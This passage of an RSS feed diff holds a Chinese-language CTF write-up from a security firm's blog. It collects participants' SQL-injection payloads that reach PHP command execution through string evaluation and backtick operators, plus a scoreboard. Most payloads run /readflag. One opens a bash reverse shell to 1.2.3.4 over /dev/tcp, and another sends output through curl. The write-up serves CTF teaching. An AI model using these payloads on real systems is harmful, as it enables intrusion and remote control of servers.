+SQL: SELECT null-- -&quot;1&quot;;&quot;\$output = \$row-&amp;gt;&quot;.system(&#39;/readflag&#39;).&quot;;&quot;; FROM mytable WHERE id = &#39;1&#39;
+PHP: $output = $row-&amp;gt;null-- -&quot;1&quot;;&quot;\$output = \$row-&amp;gt;&quot;.system(&#39;/readflag&#39;).&quot;;&quot;;;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;同樣運用註解 &lt;code class=&quot;highlighter-rouge&quot;&gt;--&lt;/code&gt; 閉合 SQL 但 PHP 又是遞減運算子的特性，而 system 又會將指令執行結果直接輸出，因此就能直接取得 flag。本人有補充說明當時測試時直接複製貼上原始碼那行接測試，後來使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;?id=1&amp;amp;column=null-- -&quot;1&quot;;&quot; &quot;.system(&#39;/readflag&#39;).&quot;;&quot;&lt;/code&gt; 精簡後的 payload XD。&lt;/p&gt;
+
+&lt;h3 id=&quot;double-quoted-string-evaluation&quot;&gt;Double-quoted String Evaluation&lt;/h3&gt;
+
+&lt;p&gt;PHP 會自動在由雙引號「”」包夾的字串中，尋找 $ 開頭的字詞，將其解析成變數再把值代入字串中，這個功能對於快速輸出已充分跳脫處理的變數值非常有幫助，可以增加程式碼可讀性；但同樣地，我們也可以利用這個功能做一下有趣的事情，例如這段 PHP 程式碼 &lt;code class=&quot;highlighter-rouge&quot;&gt;$str = &quot;${phpinfo()}&quot;;&lt;/code&gt; 就可以直接執行 phpinfo 函式，利用 &lt;code class=&quot;highlighter-rouge&quot;&gt;$str = &quot;${system(&#39;id&#39;)}&quot;;&lt;/code&gt; 就可以執行系統指令；而在 MySQL 中，雙引號「”」恰好也可以被用來表示純字串，所以我們就能構造出「MySQL 認為是純字串，PHP 卻認為需要解析執行」的 Payload。&lt;/p&gt;
+
+&lt;p&gt;讓我們先來看第一個例子：&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;by ginoah:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=id=&quot;${system(&#39;/readflag&#39;)}&quot;&amp;amp;id=1
+
+SQL: SELECT id=&quot;${system(&#39;/readflag&#39;)}&quot; FROM mytable WHERE id = &#39;1&#39;
+PHP: $output = $row-&amp;gt;id=&quot;${system(&#39;/readflag&#39;)}&quot;;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;對於 SQL 而言，就是回傳 id 與字串比較的結果；但對於 PHP 而言，上述結果是將雙引號字串解析完後才賦值給變數 &lt;code class=&quot;highlighter-rouge&quot;&gt;$row-&amp;gt;id&lt;/code&gt;，而結果就如同前面說的，它會執行系統指令 /readflag，還會將結果輸出至網頁，所以就能取得 flag！&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;by Billy (https://github.com/st424204):&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=name%2b&quot;{$_POST[1]($_POST[2])}&quot;&amp;amp;id=1
+POST: 1=system&amp;amp;2=/readflag
+
+SQL: SELECT name+&quot;{$_POST[1]($_POST[2])}&quot; FROM mytable WHERE id = &#39;1&#39;
+PHP: $output = $row-&amp;gt;name+&quot;{$_POST[1]($_POST[2])}&quot;;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;同樣利用雙引號特性，但這個例子構造的較為複雜，利用了一些鬆軟特性，在 PHP 中，若字串變數是一個存在的函式的名稱，則我們可以利用 &lt;code class=&quot;highlighter-rouge&quot;&gt;$func = &#39;system&#39;; $func(&#39;id&#39;);&lt;/code&gt; 這樣的方式來呼叫該變數，這個例子就是應用了這個特性，將我們從前端傳遞過去的 &lt;code class=&quot;highlighter-rouge&quot;&gt;$_POST[1]&lt;/code&gt; 當成函式名稱、&lt;code class=&quot;highlighter-rouge&quot;&gt;$_POST[2]&lt;/code&gt; 作為函式的參數執行，因此只要參數再帶上 &lt;code class=&quot;highlighter-rouge&quot;&gt;1=system&amp;amp;2=readflag&lt;/code&gt; 就能取得 flag！&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;by Hans (https://hans00.me)&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=id||&quot;{$_POST[&#39;fn&#39;]($_POST[&#39;cmd&#39;])}&quot;&amp;amp;id=1
+POST: fn=system&amp;amp;cmd=/readflag
+
+SQL: SELECT id||&quot;{$_POST[&#39;fn&#39;]($_POST[&#39;cmd&#39;])}&quot; FROM mytable WHERE id = &#39;1&#39;
+PHP: $output = $row-&amp;gt;id||&quot;{$_POST[&#39;fn&#39;]($_POST[&#39;cmd&#39;])}&quot;;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;這個例子與前一個利用了同樣的特性，差別在與此處的 Payload 改用 OR 邏輯運算子 &lt;code class=&quot;highlighter-rouge&quot;&gt;||&lt;/code&gt;，而前面使用的是加法算術運算子 &lt;code class=&quot;highlighter-rouge&quot;&gt;+&lt;/code&gt;，但結果都是相同的。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;by Chris Lin (https://github.com/kulisu)&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=TRUE/&quot;${system(%27/readflag%27)}&quot;;%23&amp;amp;id=1
+
+SQL: SELECT TRUE/&quot;${system(&#39;/readflag&#39;)}&quot;;# FROM mytable WHERE id = &#39;1&#39;
+PHP: $output = $row-&amp;gt;TRUE/&quot;${system(&#39;/readflag&#39;)}&quot;;#;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;這也是用相同概念，前面改用除法算術運算子 &lt;code class=&quot;highlighter-rouge&quot;&gt;/&lt;/code&gt;。看完解法才發現投稿者是同事！&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201030/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;execution-operator&quot;&gt;Execution Operator&lt;/h3&gt;
+
+&lt;p&gt;在 PHP 中存在眾多函式可以執行系統指令，其中還包括一個特殊的 &lt;a href=&quot;https://www.php.net/manual/en/language.operators.execution.php&quot;&gt;Execution Operator&lt;/a&gt;，此運算子的形式是利用反引號「&lt;code class=&quot;highlighter-rouge&quot;&gt;`&lt;/code&gt;」將字串包夾起來，這樣該字串就會被當作系統指令執行，其內部實際是執行 shell_exec，更貼心的事情是，這個運算子同樣支援 Double-quoted String Evaluation，所以若是 &lt;code class=&quot;highlighter-rouge&quot;&gt;$cmd = &#39;id&#39;; echo `$cmd`;&lt;/code&gt; 這樣的形式，PHP 就會先解析 $cmd 得出 id，再執行 id 系統指令；而在 MySQL 之中，反引號是用來表示一個 identifier，identifier 用來指示一個物件，最常見的是資料表或是資料欄，當我們執行 &lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT c FROM t&lt;/code&gt;，其中 c 和 t 就是 identifier，所以若想靠 Execution Operator 來執行指令，可能還必須同時讓 identifier 能夠被 MySQL 識別才行。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;by dalun (https://www.nisra.net):&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=id=`$_POST[1]`%23?&amp;gt;&amp;amp;id=%0a+from+(select+&#39;id&#39;,&#39;$_POST[1]&#39;)+as+a+--+
+POST: 1=/readflag
+
+SQL: SELECT id=`$_POST[1]`#?&amp;gt; FROM mytable WHERE id = &#39;
+     from (select &#39;id&#39;,&#39;$_POST[1]&#39;) as a -- &#39;
+PHP: $output = $row-&amp;gt;id=`$_POST[1]`#?&amp;gt;;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;這個解法似乎是唯一願意使用 id 參數的 XD！在 column 參數用註解符號 &lt;code class=&quot;highlighter-rouge&quot;&gt;#&lt;/code&gt; 閉合後續，在 id 參數插入換行符號並構造一個合法的 SQL，透過子查詢製造合法的 identifier，最後由 PHP 透過 execution operator 執行系統指令。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;by HexRabbit (https://twitter.com/h3xr4bb1t):&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=name+or+@`bash+-c+&quot;bash+-i+&amp;gt;%26+/dev/tcp/1.2.3.4/80+0&amp;gt;%261&quot;`&amp;amp;id=1
+
+SQL: SELECT name or @`bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/1.2.3.4/80 0&amp;gt;&amp;amp;1&quot;` FROM mytable WHERE id = &#39;1&#39;
+PHP: $output = $row-&amp;gt;name or @`bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/1.2.3.4/80 0&amp;gt;&amp;amp;1&quot;`;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;這個解法核心也是透過 execution oeperator 執行指令，不過用了一個特殊的字元 &lt;code class=&quot;highlighter-rouge&quot;&gt;@&lt;/code&gt;。在 MySQL 中，這代表 user-defined variables，後面的字串則為變數的名稱，而且名稱可以使用特殊字元，只要使用 identifier 的符號 &lt;code class=&quot;highlighter-rouge&quot;&gt;`&lt;/code&gt; 把字串包夾起來即可，而存取不存在的變數並不會導致錯誤，MySQL 只會回傳 NULL 的結果。在 PHP 中的話，&lt;code class=&quot;highlighter-rouge&quot;&gt;@&lt;/code&gt; 代表 &lt;a href=&quot;https://www.php.net/language.operators.errorcontrol&quot;&gt;error control operator&lt;/a&gt;，可以放置在表達式前，會讓 PHP 將此表達式執行產生的錯誤訊息全部忽略，由於是表達式，所以也能附加在 execution operator 之前。最後這個解法再用 &lt;code class=&quot;highlighter-rouge&quot;&gt;or&lt;/code&gt; 邏輯運算子（MySQL 與 PHP 皆支援並且意義相同）串接即可達成執行系統指令。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;by cjiso1117 (https://twitter.com/cjiso)&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=$a%2b`curl 127.0.0.1/$(/readflag)`/*!from (select &quot;asd&quot; as &quot;$a&quot;, &quot;qwe&quot; as &quot;curl 127.0.0.1/$(/readflag)&quot; ) as e*/;%23&amp;amp;id=qwe
+
+SQL: SELECT $a+`curl 127.0.0.1/$(/readflag)`/*!from (select &quot;asd&quot; as &quot;$a&quot;, &quot;qwe&quot; as &quot;curl 127.0.0.1/$(/readflag)&quot; ) as e*/;# FROM mytable WHERE id = &#39;qwe&#39;
+PHP: $output = $row-&amp;gt;$a+`curl 127.0.0.1/$(/readflag)`/*!from (select &quot;asd&quot; as &quot;$a&quot;, &quot;qwe&quot; as &quot;curl 127.0.0.1/$(/readflag)&quot; ) as e*/;#;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;同樣是利用 &lt;code class=&quot;highlighter-rouge&quot;&gt;/*! */&lt;/code&gt; 製造出 PHP 看不見、MySQL 看得見的註解文字來控制資料庫查詢結果，最後利用 execution operator 來達成執行系統指令，但由於 &lt;code class=&quot;highlighter-rouge&quot;&gt;`&lt;/code&gt; 內的文字會被 MySQL 認為是 identifier，找不到對應資源會導致錯誤，所以透過子查詢和 alias 語法強行製造出 identifier 讓查詢正確執行。&lt;del&gt;本人表示一開始覺得用 &lt;code class=&quot;highlighter-rouge&quot;&gt;/*! */&lt;/code&gt; 會很帥，結果走偏繞了一大圈&lt;/del&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;by shik (https://github.com/ShikChen/)&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=id%2b&quot;${print_r(`/readflag`)}&quot;&amp;amp;id=1
+
+SQL: SELECT id+&quot;${print_r(`/readflag`)}&quot; FROM mytable WHERE id = &#39;1&#39;
+PHP: $output = $row-&amp;gt;id+&quot;${print_r(`/readflag`)}&quot;;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;這個解法利用加法運算子組合 id identifier 和雙引號字串，接著在雙引號字串利用 evaluation 特性執行 PHP 程式碼，透過 execution operator 執行系統指令後再以 print_r 強制輸出結果，取得 flag。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;匿名:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: id=1&amp;amp;column=id%2b&quot;${`yes`}&quot;
+
+SQL: SELECT id+&quot;${`yes`}&quot; FROM mytable WHERE id = &#39;1&#39;
+PHP: $output = $row-&amp;gt;id+&quot;${`yes`}&quot;;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;另外還收到一個匿名提交的解法，思路與前面相同，總之就也附上來了～。&lt;/p&gt;
+
+&lt;h2 id=&quot;結語&quot;&gt;結語&lt;/h2&gt;
+
+&lt;p&gt;以上就是我們這次為 HITCON 2020 準備的 Wargame 的其中一道開放式題目的分享和大家的解法介紹，不知道各位喜不喜歡呢？&lt;del&gt;喜歡的話記得訂閱、按讚、分享以及開啟小鈴鐺唷！&lt;/del&gt;&lt;/p&gt;
+
+&lt;p&gt;題外話，這次我們總共有 5 道 100 分題目，是領取小獎品的基本條件，但我們還準備了 3 道僅有 1 分的 bonus 題目，類型是 2 個 web 與 1 個唯一的 pwn，讓大家能進一步挑戰進階實戰能力，而這次有解開至少一道 bonus 題的為以下兩位參加者：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;11/14 Balsn CTF 2020 總獎金十萬元: 502 分&lt;/li&gt;
+  &lt;li&gt;FI: 501&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;友情工商：由台灣知名 CTF 戰隊之一的 Balsn 舉辦的 Balsn CTF 2020 將在 11/14 舉辦，他們準備了豐富的比賽獎金與充滿創意、技術性的題目，想證明實力的朋友們可不要錯過了！&lt;/p&gt;
+
+&lt;p&gt;Balsn Twitter: https://twitter.com/balsnctf/status/1316925652700889090&lt;br /&gt;
+Balsn CTF 2020 on CTFtime: https://ctftime.org/event/1122/&lt;/p&gt;
+
+&lt;p&gt;另外的另外，最後讓我們恭喜 &lt;strong&gt;yuawn (https://twitter.com/_yuawn)&lt;/strong&gt; 以 1 分之姿榮獲 &lt;strong&gt;DEVCORE Wargame 最後 1 名&lt;/strong&gt;！全場排行榜上唯一得分不超過 100 的參加者，同時他也取得了 pwn 題目的首殺兼唯一解，恭喜他 👏👏。&lt;/p&gt;
+
+&lt;p&gt;最後附上今年的前十名，就讓我們 2021 年再見囉～&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Place&lt;/th&gt;
+      &lt;th&gt;Team&lt;/th&gt;
+      &lt;th&gt;Score&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;1&lt;/td&gt;
+      &lt;td&gt;11/14 Balsn CTF 2020 總獎金十萬元&lt;/td&gt;
+      &lt;td&gt;502&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2&lt;/td&gt;
+      &lt;td&gt;FI&lt;/td&gt;
+      &lt;td&gt;501&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;3&lt;/td&gt;
+      &lt;td&gt;mico&lt;/td&gt;
+      &lt;td&gt;500&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;4&lt;/td&gt;
+      &lt;td&gt;ankleboy&lt;/td&gt;
+      &lt;td&gt;500&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;5&lt;/td&gt;
+      &lt;td&gt;hans00&lt;/td&gt;
+      &lt;td&gt;500&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;6&lt;/td&gt;
+      &lt;td&gt;Meow&lt;/td&gt;
+      &lt;td&gt;500&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;7&lt;/td&gt;
+      &lt;td&gt;ginoah&lt;/td&gt;
+      &lt;td&gt;500&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;8&lt;/td&gt;
+      &lt;td&gt;cjiso1117&lt;/td&gt;
+      &lt;td&gt;500&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;9&lt;/td&gt;
+      &lt;td&gt;zodiuss&lt;/td&gt;
+      &lt;td&gt;500&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;10&lt;/td&gt;
+      &lt;td&gt;dalun&lt;/td&gt;
+      &lt;td&gt;500&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+</description>
+                <link>https://devco.re/blog/2020/10/30/devcore-wargame-at-hitcon-2020/</link>
+                <guid>https://devco.re/blog/2020/10/30/devcore-wargame-at-hitcon-2020</guid>
+                <pubDate>Fri, 30 Oct 2020 00:00:00 +0800</pubDate>
+        </item>
 
         <item>
                 <title>你的資安策略夠明確嗎？透過框架優先緩解真實威脅</title>
